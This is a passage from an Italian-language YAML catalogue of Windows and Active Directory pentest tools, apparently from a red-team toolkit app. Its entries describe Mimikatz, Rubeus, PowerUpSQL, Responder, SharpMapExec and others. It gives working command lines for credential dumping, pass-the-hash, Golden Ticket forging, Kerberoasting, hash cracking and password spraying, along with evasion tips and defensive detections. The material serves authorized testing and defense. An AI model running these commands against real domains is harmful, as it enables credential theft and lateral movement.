    - Estrae encryption keys Kerberos</li><li><code>sekurlsa::tickets</code> - Export
    TGT/TGS tickets</li><li><code>sekurlsa::pth</code> - Pass-the-Hash per aprire
    sessioni</li></ul></p><p><strong>kerberos:</strong> Manipolazione ticket:</p><ul><li><code>kerberos::ptt</code>
    - Pass-the-Ticket (inject TGT/TGS)</li><li><code>kerberos::golden</code> - Genera
    Golden Ticket (richiede krbtgt hash)</li><li><code>kerberos::silver</code> - Genera
    Silver Ticket per servizi specifici</li><li><code>kerberos::list</code> - Lista
    ticket in cache</li></ul></p><p><strong>lsadump:</strong> Dump secrets locali
    e DC:</p><ul><li><code>lsadump::sam</code> - Estrae hash da SAM locale</li><li><code>lsadump::lsa
    /patch</code> - Dump LSA secrets da memoria</li><li><code>lsadump::dcsync</code>
    - Replica secrets da DC (richiede replication rights)</li></ul></p><p><strong>dpapi:</strong>
    Decrypt secrets protetti da Data Protection API (credenziali browser, RDP, WiFi).</p><h4
    class=\"rt-green\">Workflow tipico</h4><p><strong>1. Elevazione privilegi:</strong></p><pre><code>mimikatz
    # privilege::debug<br>mimikatz # token::elevate</code></pre><p><strong>2. Dump
    credenziali:</strong></p><pre><code>mimikatz # sekurlsa::logonpasswords</code></pre><p><strong>3.
    Pass-the-Hash:</strong></p><pre><code>mimikatz # sekurlsa::pth /user:admin /domain:acme.local
    /ntlm:hash /run:cmd.exe</code></pre><p><strong>4. Golden Ticket (persistence):</strong></p><pre><code>mimikatz
    # kerberos::golden /domain:acme.local /sid:S-1-5-21... /rc4:krbtgt_hash /user:fakeadmin
    /ptt</code></pre><h4 class=\"rt-amber\">Tecniche avanzate</h4><ul><li><strong>DCSync:</strong>
    Replica password hashes da DC senza accesso fisico</li><li><strong>Skeleton Key:</strong>
    Backdoor autenticazione su DC per password master</li><li><strong>Zerologon:</strong>
    Reset password computer account DC (CVE-2020-1472)</li><li><strong>DPAPI abuse:</strong>
    Decrypt credenziali di altri utenti con master keys</li></ul><h4 class=\"rt-red\"\
    >Rilevamento e OPSEC</h4><p><strong>Signature rilevabili:</strong><ul><li>Accesso
    a LSASS.exe (Sysmon Event ID 10)</li><li>Caricamento driver mimikatz (mimidrv.sys)</li><li>Pattern
    in memoria riconosciuti da EDR</li><li>DCSync genera eventi 4662 (replication)</li></ul></p><p><strong>Tecniche
    evasion:</strong><ul><li>Eseguire da memoria con invoke-mimikatz.ps1</li><li>Offuscare
    stringhe e rebuild custom</li><li>Usare process injection invece di esecuzione
    diretta</li><li>Limitare dump a processi specifici</li></ul></p><p><strong>Mitigazioni
    difensive:</strong> Credential Guard, WDigest disabilitato (Win 8.1+), LSASS protection,
    Restricted Admin mode RDP, monitoring accessi LSASS.</p>"
  best_in: false
  category_path: ["00_Common", "Tools_Windows"]
  notes:

- id: "pingcastle"
  name: "PingCastle"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "windows"
  phases: ["00_Common"]
  caps: ["ad-health", "risk-scoring", "reporting"]
  repo: "https://www.pingcastle.com/download/"
  desc: "Valutazione rapida di sicurezza Active Directory: health check, cartografia
    trust, indicatori di rischio."
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>PingCastle esegue un assessment
    dell’AD generando un report con punteggio di rischio, indicatori tecnici e raccomandazioni.
    Include analisi di trust, deleghe e vettori comuni di compromissione.</p><h4 class=\"\
    rt-blue\">Funzioni chiave</h4><ul><li>HealthCheck AD con punteggi e remediation.</li><li>Cartografia
    della foresta: domini, trust, esposizioni.</li><li>Report HTML interattivi per
    management e tecnici.</li></ul><h4 class=\"rt-blue\">Uso e OPSEC</h4><p>Eseguire
    con account autorizzato di dominio e scopo ben definito. Condividere il report
    secondo la policy cliente.</p>"
  best_in: false
  category_path: ["00_Common", "Tools_Windows"]
  notes:

- id: "powerupsql"
  name: "PowerUpSQL"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "windows"
  phases: ["00_Common"]
  caps: ["mssql-discovery", "audit-weak-config", "priv-esc", "os-cmd"]
  repo: "https://github.com/NetSPI/PowerUpSQL"
  desc: "Modulo PowerShell per discovery SQL Server, audit configurazioni deboli e
    privilege escalation tramite abusi OS command execution e link server"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PowerUpSQL</strong>
    di NetSPI è un toolkit PowerShell per attacking SQL Server durante penetration
    test interni e red team engagement. Supporta discovery di istanze, audit di weak
    configuration, privilege escalation su scala e post-exploitation actions come
    OS command execution. Utilizzabile anche da amministratori per inventory rapido
    e threat hunting.</p><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Discovery:</strong><ul><li><code>Get-SQLInstanceDomain</code>
    - Enumera istanze SQL via SPN in Active Directory</li><li><code>Get-SQLInstanceBroadcast</code>
    - Discovery via UDP broadcast (porta 1434)</li><li><code>Get-SQLInstanceScanUDP</code>
    - Scan subnet per SQL Server Browser</li><li><code>Get-SQLConnectionTest</code>
    - Test connessioni massive</li></ul></p><p><strong>Weak Configuration Auditing:</strong><ul><li><code>Invoke-SQLAudit</code>
    - Check completo su configurazioni deboli</li><li><code>Get-SQLServerInfo</code>
    - Versione, patch level, service account</li><li><code>Get-SQLDatabase</code>
    - Enum database accessibili</li><li>Verifica default credentials, excessive privileges,
    weak encryption</li></ul></p><p><strong>Privilege Escalation:</strong><ul><li><code>Invoke-SQLEscalatePriv</code>
    - Tenta abusi automatici (impersonation, trustworthy DB)</li><li><code>Get-SQLServerLinkCrawl</code>
    - Naviga catene di link server</li><li><code>Invoke-SQLUncPathInjection</code>
    - Force authentication via UNC paths</li></ul></p><p><strong>Post-Exploitation:</strong><ul><li><code>Invoke-SQLOSCmd</code>
    - Esecuzione comandi OS via xp_cmdshell</li><li><code>Get-SQLColumnSampleData</code>
    - Cerca pattern dati sensibili (SSN, CC)</li><li><code>Get-SQLQuery</code> - Query
    custom su istanze multiple</li></ul></p><h4 class=\"rt-green\">Workflow tipico</h4><p><strong>1.
    Discovery in dominio:</strong></p><pre><code>PS> Get-SQLInstanceDomain | Get-SQLServerInfo</code></pre><p><strong>2.
    Test accesso:</strong></p><pre><code>PS> Get-SQLInstanceDomain | Get-SQLConnectionTest</code></pre><p><strong>3.
    Audit completo:</strong></p><pre><code>PS> Invoke-SQLAudit -Instance SQL01 -Verbose</code></pre><p><strong>4.
    Privilege escalation:</strong></p><pre><code>PS> Invoke-SQLEscalatePriv -Instance
    SQL01 -Verbose</code></pre><p><strong>5. Command execution:</strong></p><pre><code>PS>
    Invoke-SQLOSCmd -Instance SQL01 -Command 'whoami' -RawResults</code></pre><h4
    class=\"rt-amber\">Tecniche di abuso</h4><p><strong>Impersonation:</strong> Sfrutta
    IMPERSONATE permission su login privilegiati per assumere privilegi di sa o sysadmin.</p><p><strong>Trustworthy
    DB:</strong> Database con TRUSTWORTHY ON permettono escalation se si ha db_owner.</p><p><strong>Link
    server crawling:</strong> Naviga catene di link per raggiungere istanze non accessibili
    direttamente ed eseguire query/comandi con contesto privilegiato remoto.</p><h4
    class=\"rt-red\">Considerazioni operative</h4><p>Documentare modifiche a sp_configure
    (xp_cmdshell enable) e ripristinare post-test. SQL Server audit logs registrano
    query e impersonation. Limitare scope a istanze autorizzate e considerare impatto
    su database production.</p>"
  best_in: false
  category_path: ["00_Common", "Tools_Windows"]
  notes:

- id: "powerview-ps1"
  name: "PowerView.ps1"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "windows"
  phases: ["00_Common"]
  caps: ["ad-enum", "acl-abuse", "situational-awareness"]
  repo: "https://github.com/PowerShellMafia/PowerSploit"
  desc: "Modulo PowerShell per enumerazione AD avanzata (ACL, deleghe, GPO, sessioni)
    e individuazione path di privilege escalation"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PowerView.ps1</strong>
    è il modulo Recon di PowerSploit per enumerazione completa di Active Directory.
    Fornisce network e Windows domain enumeration/exploitation con focus su relazioni
    di trust, ACL exploitable e situational awareness. Ampiamente usato per preparare
    dati input a BloodHound.</p><h4 class=\"rt-purple\">Categorie di enumerazione</h4><p><strong>Utenti
    e gruppi:</strong><ul><li><code>Get-NetUser</code> - Enum utenti con filtri (AdminCount,
    SPN, lastlogon)</li><li><code>Get-NetGroup</code> - Gruppi e membership</li><li><code>Get-NetGroupMember</code>
    - Membri ricorsivi</li><li><code>Get-NetLocalGroup</code> - Local admins su host
    remoti</li></ul></p><p><strong>Computer e sessioni:</strong><ul><li><code>Get-NetComputer</code>
    - Computer di dominio con filtri</li><li><code>Get-NetSession</code> - Sessioni
    attive su remoti</li><li><code>Get-NetLoggedon</code> - Utenti logged on via registry</li><li><code>Find-DomainUserLocation</code>
    - Hunting sessioni di account specifici</li></ul></p><p><strong>Trust e forest:</strong><ul><li><code>Get-NetDomainTrust</code>
    - Trust relationships</li><li><code>Get-NetForestDomain</code> - Domini in forest
    corrente</li><li><code>Get-NetForestTrust</code> - Trust inter-forest</li></ul></p><p><strong>ACL
    e deleghe:</strong><ul><li><code>Find-InterestingDomainAcl</code> - ACE exploitable</li><li><code>Get-ObjectAcl</code>
    - ACL raw di oggetti</li><li><code>Add-ObjectAcl</code> - Modifica ACL (post-compromise)</li></ul></p><p><strong>GPO:</strong><ul><li><code>Get-NetGPO</code>
    - Group Policy Objects</li><li><code>Get-NetGPOGroup</code> - GPO che modificano
    local groups</li><li><code>Find-GPOLocation</code> - Applicazione GPO</li></ul></p><p><strong>SPN
    e Kerberoasting:</strong><ul><li><code>Get-NetUser -SPN</code> - Account kerberoastable</li><li><code>Request-SPNTicket</code>
    - Richiede TGS</li></ul></p><h4 class=\"rt-green\">Esempi operativi</h4><p><strong>Admin
    privilegiati:</strong></p><pre><code>PS> Get-NetUser -AdminCount 1 | select samaccountname,memberof</code></pre><p><strong>Hunting
    sessioni DA:</strong></p><pre><code>PS> Find-DomainUserLocation -UserGroupIdentity
    'Domain Admins'</code></pre><p><strong>ACL exploitable:</strong></p><pre><code>PS>
    Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'Domain
    Users'}</code></pre><h4 class=\"rt-amber\">Integration con BloodHound</h4><p>PowerView
    è usato per query ad-hoc e investigation mirata. SharpHound ha sostituito PowerView
    per data collection automatica, ma PowerView rimane utile per enumerazione custom
    e troubleshooting.</p><h4 class=\"rt-red\">OPSEC e rilevamento</h4><p>Query LDAP
    massive rilevabili da anomaly detection. Difese monitorano query con filtri ampi
    (AdminCount, SPN), accesso attributi sensibili e pattern tool automatici. PowerShell
    script block logging cattura comandi eseguiti.</p>"
  best_in: false
  category_path: ["00_Common", "Tools_Windows"]
  notes:

- id: "responder-windows"
  name: "Responder-Windows"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "windows"
  phases: ["00_Common"]
  caps: ["llmnr-nbns-mdns-poisoning", "hash-capture", "relay"]
  repo: "https://github.com/lgandx/Responder-Windows"
  desc: "Port Windows di Responder per poisoning LLMNR/NBNS/mDNS e cattura hash NTLM,
    con listener rogue HTTP/SMB/LDAP per relay attack"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Responder-Windows</strong>
    è il port nativo di Responder per Windows, permettendo MITM attacks senza Python.
    Effettua poisoning di protocolli name resolution e fornisce listener rogue per
    cattura credenziali NetNTLM.</p><h4 class=\"rt-purple\">Protocolli supportati</h4><p><strong>Spoofers:</strong>
    LLMNR (5355/UDP), NBNS (137/UDP), mDNS (5353/UDP)</p><p><strong>Listener:</strong>
    HTTP/HTTPS (80/443), SMB, LDAP, WebDAV, FTP, POP3, IMAP, SMTP</p><h4 class=\"\
    rt-green\">Utilizzo base</h4><p><strong>Start default:</strong></p><pre><code>Responder.exe
    -I eth0</code></pre><p><strong>Solo HTTP:</strong></p><pre><code>Responder.exe
    -I eth0 -w -F</code></pre><p><strong>Analysis mode passivo:</strong></p><pre><code>Responder.exe
    -I eth0 -A</code></pre><h4 class=\"rt-amber\">Scenari d'attacco</h4><p><strong>Credential
    harvesting:</strong> Host con fallback a LLMNR/NBNS inviano broadcast queries.
    Responder risponde e cattura hash durante autenticazione client.</p><p><strong>Hash
    cracking:</strong> Hash salvati in <code>logs/</code> directory, crack con:<br><code>hashcat
    -m 5600 hashes.txt wordlist.txt</code> (NTLMv2)</p><h4 class=\"rt-red\">OPSEC</h4><p>Rumoroso
    e rilevabile: genera risposte a broadcast queries, può causare service disruption.
    SMB signing e EPA bloccano relay. Best practice: analysis mode prima di active
    poisoning, whitelist host critici, limitare durata attacco.</p>"
  best_in: false
  category_path: ["00_Common", "Tools_Windows"]
  notes:

- id: "rpcdump-windows"
  name: "rpcdump_windows.exe"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "windows"
  phases: ["00_Common"]
  caps: ["rpc-enum", "endpoint-mapper"]
  repo: "https://github.com/csandker/RPCDump"
  desc: "Tool per enumerazione RPC Endpoint Mapper con listing di interfacce/UUID/binding,
    utile per mappare superfici d'attacco RPC su Windows"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>rpcdump_windows.exe</strong>
    interroga RPC Endpoint Mapper (135/tcp) per elencare interfacce RPC registrate
    su host Windows, inclusi UUID, versione, protocolli binding e annotation.</p><h4
    class=\"rt-purple\">Informazioni raccolte</h4><p>Per ogni interfaccia: UUID (identificatore
    unico), Version (major.minor), Binding strings (ncacn_np, ncacn_ip_tcp, ncalrpc),
    Annotation (descrizione), Endpoint (named pipe, TCP port, local RPC).</p><h4 class=\"\
    rt-green\">Utilizzo</h4><p><strong>Locale:</strong> <code>rpcdump.exe</code><br><strong>Remoto:</strong>
    <code>rpcdump.exe -p 192.168.1.10</code><br><strong>Verbose:</strong> <code>rpcdump.exe
    -p target -v</code></p><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Service
    discovery:</strong> Identificare servizi custom non documentati.<br><strong>Vulnerability
    correlation:</strong> Confrontare UUID con CVE note (MS08-067, PrintNightmare,
    PetitPotam).<br><strong>ACL testing:</strong> Testare permessi su named pipes
    ed endpoints dopo enum.</p><h4 class=\"rt-red\">UUID interessanti</h4><p>SAMR:
    12345778-1234-ABCD-EF00-0123456789AB<br>LSARPC: 3919286a-b10c-11d0-9ba8-00c04fd92ef5<br>SVCCTL:
    367abb81-9844-35f1-ad32-98f038001003<br>NETLOGON: 12345678-1234-ABCD-EF00-01234567CFFB</p>"
  best_in: false
  category_path: ["00_Common", "Tools_Windows"]
  notes:

- id: "rubeus"
  name: "Rubeus.exe"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "windows"
  phases: ["00_Common"]
  caps: ["kerberos-abuse", "asreproast", "kerberoast", "ptt", "ticket-management"]
  repo: "https://github.com/GhostPack/Rubeus"
  desc: "Toolkit C# per attacchi Kerberos (AS-REP roast, Kerberoasting, ticket dump/inject/forge)
    e abuse di delegation su domini AD"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Rubeus</strong> di GhostPack
    è il toolkit di riferimento per attacchi Kerberos su AD. Implementa credential
    access, privilege escalation e persistence tramite manipolazione ticket TGT/TGS.</p><h4
    class=\"rt-purple\">Comandi principali</h4><p><strong>AS-REP Roasting:</strong></p><pre><code>Rubeus.exe
    asreproast /format:hashcat /outfile:hashes.txt</code></pre><p><strong>Kerberoasting:</strong></p><pre><code>Rubeus.exe
    kerberoast /outfile:tgs.txt /nowrap</code></pre><p><strong>Ticket dump:</strong></p><pre><code>Rubeus.exe
    dump /service:krbtgt /nowrap</code></pre><p><strong>Pass-the-Ticket:</strong></p><pre><code>Rubeus.exe
    ptt /ticket:base64ticket</code></pre><p><strong>Overpass-the-Hash:</strong></p><pre><code>Rubeus.exe
    asktgt /user:admin /rc4:hash /ptt</code></pre><p><strong>Golden Ticket:</strong></p><pre><code>Rubeus.exe
    golden /rc4:krbtgt_hash /user:fake /id:500 /domain:acme.local /sid:S-1-5-21...
    /ptt</code></pre><p><strong>S4U abuse:</strong></p><pre><code>Rubeus.exe s4u /user:svc
    /rc4:hash /impersonateuser:admin /msdsspn:cifs/target /ptt</code></pre><h4 class=\"\
    rt-green\">Workflow AS-REP Roasting</h4><p>1. Enum: <code>Rubeus.exe asreproast
    /format:hashcat</code><br>2. Crack: <code>hashcat -m 18200 hashes.txt wordlist.txt</code><br>3.
    Validazione credenziali</p><h4 class=\"rt-amber\">Delegation abuse</h4><p><strong>Unconstrained:</strong>
    Cattura TGT di utenti autenticati.<br><strong>Constrained:</strong> Richiedi ticket
    per servizi specificati impersonando utenti.<br><strong>RBCD:</strong> Configura
    resource-based constrained delegation per accesso risorse.</p><h4 class=\"rt-red\"\
    >Rilevamento</h4><p>Eventi 4768/4769/4770 anomali, 4672 per operazioni elevated.
    Mitigazioni: AES-only Kerberos, Protected Users group, SIEM rules per anomalie
    AS-REQ/TGS.</p>"
  best_in: false
  category_path: ["00_Common", "Tools_Windows"]
  notes:

- id: "securityassessment-ps1"
  name: "SecurityAssessment.ps1"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "windows"
  phases: ["00_Common"]
  caps: ["host-baseline", "policy-audit", "inventory"]
  repo: ""
  desc: "Script PowerShell per raccolta baseline sicurezza host Windows (GPO, policy,
    servizi, patch) con output strutturato per audit e hardening"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SecurityAssessment.ps1</strong>
    raccoglie baseline di sicurezza host Windows esportando configurazioni, policy
    effettive e inventory sistema in formato strutturato. Solo lettura passiva, nessuna
    modifica.</p><h4 class=\"rt-purple\">Dati raccolti</h4><p><strong>Group Policy:</strong>
    gpresult /h con policy applicate.<br><strong>Security Policy:</strong> secedit
    export, auditpol, User Rights Assignment.<br><strong>Network config:</strong>
    SMB versions/signing, NTLM settings, firewall rules.<br><strong>System inventory:</strong>
    Software, patch level, servizi, scheduled tasks, processi.<br><strong>Security
    features:</strong> Defender status, AppLocker, BitLocker, UAC.</p><h4 class=\"\
    rt-green\">Esecuzione</h4><p><strong>Prerequisiti:</strong> PowerShell elevated<br><strong>Basic:</strong>
    <code>PS> .\\SecurityAssessment.ps1</code><br><strong>Custom output:</strong>
    <code>PS> .\\SecurityAssessment.ps1 -OutputPath C:\\Assessments</code></p><p>Output:
    ZIP con report, HTML summary dashboard, log timestamp.</p><h4 class=\"rt-amber\"\
    >Casi d'uso</h4><p><strong>Pre-hardening baseline:</strong> Stato prima di security
    baselines.<br><strong>Compliance verification:</strong> Confronto con benchmarks
    (CIS, DISA STIG).<br><strong>Post-incident forensics:</strong> Raccolta configurazioni.<br><strong>Golden
    image validation:</strong> Verifica standard security pre-deployment.</p><h4 class=\"\
    rt-red\">Analisi output</h4><p>Richiede interpretazione analyst: confrontare User
    Rights con least privilege, verificare audit policy, identificare software obsoleto,
    validare network hardening.</p>"
  best_in: false
  category_path: ["00_Common", "Tools_Windows"]
  notes:

- id: "sharphound"
  name: "SharpHound.exe"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "windows"
  phases: ["00_Common"]
  caps: ["ad-graph-collection", "bloodhound-ingest"]
  repo: "https://github.com/SpecterOps/SharpHound"
  desc: "Data collector ufficiale per BloodHound che raccoglie relazioni AD (ACL,
    sessioni, gruppi, trust) generando dataset per analisi attack path"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SharpHound</strong>
    è il collector C# ufficiale per BloodHound, progettato per mappare relazioni e
    permessi AD tramite query LDAP, API rete e interrogazioni host. Produce JSON/ZIP
    importabili in BloodHound per visualizzazione grafica attack paths.</p><h4 class=\"\
    rt-purple\">Collection Methods</h4><p>Selezionabili con <code>-c</code>:</p><ul><li><strong>Default</strong>
    - Bilanciato per maggior parte scenari</li><li><strong>All</strong> - Completa
    (rumorosa e lenta)</li><li><strong>DCOnly</strong> - Solo da DC (no host interrogation)</li><li><strong>Session</strong>
    - Solo sessioni logged on</li><li><strong>LoggedOn</strong> - Utenti via NetSessionEnum/Registry</li><li><strong>Group</strong>
    - Solo membership gruppi</li><li><strong>LocalAdmin</strong> - Local administrators
    su computer</li><li><strong>GPOLocalGroup</strong> - Local admin grants via GPO</li><li><strong>Trusts</strong>
    - Trust relationships</li><li><strong>ACL</strong> - Access Control Lists</li><li><strong>RDP,
    DCOM, PSRemote</strong> - Remote access rights</li></ul></p><h4 class=\"rt-green\"\
    >Esempi</h4><p><strong>Standard:</strong> <code>SharpHound.exe -c All</code><br><strong>Stealth
    DC-only:</strong> <code>SharpHound.exe -c DCOnly</code><br><strong>Loop sessioni:</strong>
    <code>SharpHound.exe -c Session --Loop --LoopDuration 02:00:00</code><br><strong>Con
    throttling:</strong> <code>SharpHound.exe -c All --Throttle 1000 --Jitter 20</code></p><h4
    class=\"rt-amber\">Output</h4><p>ZIP con JSON: computers.json, users.json, groups.json,
    domains.json, gpos.json, ous.json. Import in BloodHound via drag-and-drop.</p><h4
    class=\"rt-red\">OPSEC</h4><p>Session/LoggedOn interrogano tutti computer via
    SMB (traffico massivo, failed connections). Query LDAP massive impattano DC. SOC
    rileva: pattern query tipici SharpHound, connessioni SMB fallite massive, accesso
    attributi sensibili. Best practice: DCOnly per stealth, All su scope limitato,
    throttling, pianificare finestre manutenzione.</p>"
  best_in: false
  category_path: ["00_Common", "Tools_Windows"]
  notes:

- id: "sharpmapexec"
  name: "SharpMapExec.exe"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "windows"
  phases: ["00_Common"]
  caps: ["lateral-movement", "spray", "remote-exec"]
  repo: "https://github.com/cube0x0/SharpMapExec"
  desc: "Reimplementazione C# di CrackMapExec per lateral movement e remote execution
    da Windows senza dipendenze Python"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SharpMapExec</strong>
    è reimplementazione C# di CrackMapExec core capabilities, permettendo credential
    validation, enumeration e command execution su host remoti Windows da ambiente
    .NET senza Python.</p><h4 class=\"rt-purple\">Funzionalità</h4><p><strong>Protocol:</strong>
    SMB, WMI, WinRM per auth/execution.<br><strong>Credential testing:</strong> Password,
    NTLM hash, Kerberos ticket per spray su multiple target.<br><strong>Enumeration:</strong>
    Shares SMB/ACL, local admins, sessioni attive, system info.<br><strong>Execution:</strong>
    WMI commands, SMB via service, WinRM PowerShell remoting.</p><h4 class=\"rt-green\"\
    >Utilizzo</h4><p><strong>SMB spray:</strong></p><pre><code>SharpMapExec.exe smb
    /targets:hosts.txt /user:admin /password:pass</code></pre><p><strong>Con hash:</strong></p><pre><code>SharpMapExec.exe
    smb /targets:192.168.1.0/24 /user:admin /ntlm:hash</code></pre><p><strong>Command
    exec:</strong></p><pre><code>SharpMapExec.exe smb /targets:target.txt /user:admin
    /password:pass /command:\"whoami\"</code></pre><h4 class=\"rt-amber\">Vantaggi
    vs CME</h4><p>Esecuzione nativa .NET senza Python, più difficile rilevare per
    signature AV, integrazione C2 .NET, compile-time obfuscation possibile.</p><h4
    class=\"rt-red\">OPSEC</h4><p>Stesso footprint network di CME: auth massive generano
    4624/4625 su tutti host. Throttling, targeting selettivo, monitor account lockout
    necessari.</p>"
  best_in: false
  category_path: ["00_Common", "Tools_Windows"]
  notes:

- id: "sharpview"
  name: "SharpView.exe"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "windows"
  phases: ["00_Common"]
  caps: ["ad-enum", "acl-enum", "situational-awareness"]
  repo: "https://github.com/tevora-threat/SharpView"
  desc: "Port C# di PowerView per enumerazione AD quando PowerShell è ristretto, con
    funzionalità di ACL analysis e situational awareness"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SharpView</strong> è
    port C# di PowerView per scenari con PowerShell ristretto da Constrained Language
    Mode, AppLocker o monitoring aggressivo. Compila in eseguibile standalone senza
    dipendenze script.</p><h4 class=\"rt-purple\">Funzioni da PowerView</h4><p><strong>User
    enum:</strong> Get-DomainUser con filtri AdminCount, SPN, attributi custom.<br><strong>Group
    enum:</strong> Get-DomainGroup, Get-DomainGroupMember ricorsivo.<br><strong>Computer
    enum:</strong> Get-DomainComputer con filtri OS/service pack.<br><strong>ACL analysis:</strong>
    Get-ObjectAcl per permessi exploitable.<br><strong>Trust mapping:</strong> Get-DomainTrust
    inter-domain.<br><strong>GPO enum:</strong> Get-DomainGPO e relazioni OU.</p><h4
    class=\"rt-green\">Utilizzo</h4><p><strong>Utenti privilegiati:</strong></p><pre><code>SharpView.exe
    Get-DomainUser -AdminCount</code></pre><p><strong>Unconstrained delegation:</strong></p><pre><code>SharpView.exe
    Get-DomainComputer -Unconstrained</code></pre><p><strong>ACL oggetto:</strong></p><pre><code>SharpView.exe
    Get-ObjectAcl -SamAccountName \"Domain Admins\" -ResolveGUIDs</code></pre><h4
    class=\"rt-amber\">Integration</h4><p>Usato per raccolta dati preliminare a BloodHound.
    Output parsabile e convertibile in formato ingest BloodHound con script custom.</p><h4
    class=\"rt-red\">Evasion</h4><p>Vantaggi: no PowerShell dependency (evita script
    block logging), offuscazione compile-time, in-memory execution via execute-assembly.
    Limitazioni: binary firmato whitelistable, stesso traffico LDAP PowerView, meno
    feature-complete.</p>"
  best_in: false
  category_path: ["00_Common", "Tools_Windows"]
  notes:

- id: "snaffler"
  name: "Snaffler.exe"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "windows"
  phases: ["00_Common"]
  caps: ["fileshare-hunting", "secret-discovery", "regex-content"]
  repo: "https://github.com/SnaffCon/Snaffler"
  desc: "Scanner di file share Windows per individuare credenziali e dati sensibili
    tramite pattern matching e regex content analysis"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Snaffler</strong> è
    tool content discovery per file share Windows che scansiona SMB shares cercando
    informazioni sensibili: credenziali, chiavi API, configurazioni, PII. Usa pattern
    matching intelligente e regex per trovare 'needles in haystack'.</p><h4 class=\"\
    rt-purple\">Classificazione finding</h4><p><strong>Black</strong> - Massima gravità
    (password, chiavi private, DB connection strings)<br><strong>Red</strong> - Alta
    gravità (config files, scripts con creds)<br><strong>Yellow</strong> - Media gravità
    (interessanti non immediately critical)<br><strong>Green</strong> - Bassa gravità
    (potentially interesting, high false positive)</p><h4 class=\"rt-green\">Utilizzo</h4><p><strong>Scan
    dominio:</strong> <code>Snaffler.exe -s -o snaffler.log</code><br><strong>Target
    specifico:</strong> <code>Snaffler.exe -n -s -o results.log -i C:\\,\\\\server\\
    share</code><br><strong>Solo severity alta:</strong> <code>Snaffler.exe -s -o
    critical.log -r Black</code><br><strong>Regex custom:</strong> <code>Snaffler.exe
    -s -o output.log -m \"(password|credential)\"</code></p><h4 class=\"rt-amber\"\
    >Pattern detection</h4><p>Cerca: file extensions (.kdbx, .ppk, .key, .pem, .pfx,
    .rdp), nome file patterns (password, backup, secret), content regex (connection
    strings, API keys, private keys), config files (web.config, .env, appsettings.json).
    Pattern personalizzabili via rule files.</p><h4 class=\"rt-red\">Considerazioni</h4><p>Performance:
    su share grandi richiede ore e traffico SMB significativo. Usare <code>-t</code>
    threading control, <code>-m</code> per scope filtering. Trova solo file accessibili
    con credenziali correnti. SMB enum massiva rilevabile: timing fuori orario, throttling,
    coordination blue team. Log contiene path sensibili: proteggere appropriatamente.</p>"
  best_in: false
  category_path: ["00_Common", "Tools_Windows"]
  notes:

- id: "sysinternals-suite"
  name: "SysinternalsSuite"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "windows"
  phases: ["00_Common"]
  caps: ["proc-monitoring", "forensics", "troubleshooting"]
  repo: "https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite"
  desc: "Raccolta Microsoft di utility per analisi processi, servizi, registry e rete
    (Autoruns, ProcMon, Sysmon, PsTools) per troubleshooting e DFIR"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Sysinternals Suite</strong>
    è collezione Microsoft di utility per amministrazione avanzata, troubleshooting
    e forensics Windows. Include 70+ tool per analisi processi, filesystem, registry,
    networking, security, essenziali per incident response e pentest.</p><h4 class=\"\
    rt-purple\">Tool principali</h4><p><strong>Autoruns:</strong> Visualizza programmi
    autostart (registry, startup folder, scheduled tasks, services, drivers). Essenziale
    per persistence analysis e malware detection.</p><p><strong>Process Monitor:</strong>
    Real-time monitoring filesystem, registry, process/thread, network. Fondamentale
    per reverse engineering e troubleshooting.</p><p><strong>Process Explorer:</strong>
    Task manager avanzato con dependency view, handle inspection, DLL listing, performance
    metrics.</p><p><strong>Sysmon:</strong> System Monitor che logga eventi dettagliati
    (process creation, network connections, file creation) su Event Log per SIEM ingestion
    e threat hunting.</p><p><strong>PsTools:</strong> Command-line tools administration
    remota: PsExec (remote command), PsList (process listing), PsKill (terminate processi),
    PsLoggedOn (logged on users), PsInfo (system info).</p><p><strong>TCPView:</strong>
    Real-time monitoring connessioni TCP/UDP con risoluzione endpoint e process mapping.</p><p><strong>AccessChk:</strong>
    Verifica access rights su files, registry, services, processes.</p><p><strong>Strings:</strong>
    Estrae stringhe ASCII/Unicode da binari per quick analysis eseguibili sospetti.</p><h4
    class=\"rt-green\">Utilizzo in pentest</h4><p><strong>Post-exploitation recon:</strong></p><pre><code>psinfo.exe
    \\\\target</code> - System info<br><code>psloggedon.exe \\\\target</code> - Logged
    on users</p><p><strong>Lateral movement:</strong><br><code>psexec.exe \\\\target
    -u admin -p pass cmd.exe</code></pre><p><strong>Persistence check:</strong> Autoruns
    per enum autostart locations e validare artifacts.</p><p><strong>Process analysis:</strong>
    Process Explorer per identificare injection, hollowing, evasion techniques.</p><p><strong>Network
    monitoring:</strong> TCPView per detection C2 callbacks o data exfiltration.</p><h4
    class=\"rt-amber\">Sysmon per detection</h4><p><strong>Installazione:</strong></p><pre><code>sysmon64.exe
    -accepteula -i sysmonconfig.xml</code></pre><p>Eventi chiave:</p><ul><li>Event
    ID 1 - Process creation con command line</li><li>Event ID 3 - Network connections</li><li>Event
    ID 7 - Image loaded (DLL)</li><li>Event ID 10 - Process access (credential dumping
